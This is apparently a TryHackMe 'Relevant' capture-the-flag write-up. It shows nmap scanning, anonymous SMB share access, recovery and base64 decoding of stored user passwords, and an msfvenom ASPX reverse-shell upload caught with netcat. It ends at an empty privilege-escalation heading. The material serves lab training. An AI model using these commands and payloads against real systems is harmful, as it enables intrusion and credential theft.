---
title: THM-Relevant
date: "2022-01-10"
description: Attacking windows via IIS, SMB and SEImpersonate
tldr: Windows attacks
tags: [windows,printspool,iis,smb,tryhackme]

---

## Information Gathering
`IP address: 10.10.81.222`
  
when surfing with firefox to the IP, there's a IIS webserver page being presented. This should be further enumerated.

## Scan
Run nmap to see what ports that might be presented.

```shell
nmap -Pn 10.10.81.222 -p-  
  
Completed SYN Stealth Scan at 15:07, 320.37s elapsed (65535 total ports)  
Nmap scan report for 10.10.81.222  
Host is up (0.097s latency).  
Scanned at 2022-01-10 15:02:33 CET for 321s  
Not shown: 65527 filtered tcp ports (no-response)  
PORT STATE SERVICE  
80/tcp open http  
135/tcp open msrpc  
139/tcp open netbios-ssn  
445/tcp open microsoft-ds  
3389/tcp open ms-wbt-server  
49663/tcp open unknown  
49666/tcp open unknown  
49668/tcp open unknown
```

Here the SMB port (445) seems like a good start to get some more information about shares and such.

## Enumeration

### SMBClient
```shell
$ impacket-smbclient Guest:''@10.10.81.222  
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation  
  
Password:  
Type help for list of commands  
# shares  
ADMIN$  
C$  
IPC$  
nt4wrksv  
  
# use nt4wrksv  
# ls  
drw-rw-rw- 0 Sat Jul 25 23:46:04 2020 .  
drw-rw-rw- 0 Sat Jul 25 23:46:04 2020 ..  
-rw-rw-rw- 98 Sat Jul 25 17:35:44 2020 passwords.txt  
# get passwords.txt
```

after finding the passwords.txt, let's check the contents.

```shell
$ cat passwords.txt  
[User Passwords - Encoded]  
Qm9iIC0gIVBAJCRXMHJEITEyMw==  
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk  
  
$ echo -n "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d 
Bob - !P@$$W0rD!123  
  
$ echo -n "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d  
Bill - Juw4nnaM4n420696969!$$$
```

Great! some user credentials were found, these should come in handy if they work.

### IIS on port 49663
While testing out the higher ports, IIS was sending replies on port `49663` as well and after some tinkering the `passwords.txt` could be read: 

```shell
$ curl http://10.10.81.222:49663/nt4wrksv/passwords.txt
```

## Initial Access
On the SMB share `nt4wrksv` we have write-permissions, which allows us to upload malicious files like a reverse web-shell. 

create a webshell with msfvenom and upload it. Have a netcat session ready to catch the incoming shell on port 9997

```shell
nc -nlvp 9997

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.12.24 LPORT=9997 -f aspx -o reverse.aspx

impacket-smbclient bill:'Juw4nnaM4n420696969!$$$'@10.10.81.222  
# use nt4wrksv
# put reverse.aspx

firefox http://10.10.81.222:49663/nt4wrksv/reverse.aspx
```

wait for a little while, and then receive the shell

```shell
┌──(kryssar㉿kali)-[/mnt/hgfs/VMSHARED/tryhackme]  
└─$ nc -nlvp 9997  
listening on [any] 9997 ...  
connect to [10.11.12.24] from (UNKNOWN) [10.10.81.222] 49762  
Microsoft Windows [Version 10.0.14393]  
(c) 2016 Microsoft Corporation. All rights reserved.  
  
c:\windows\system32\inetsrv>
```


## Privilege Escalation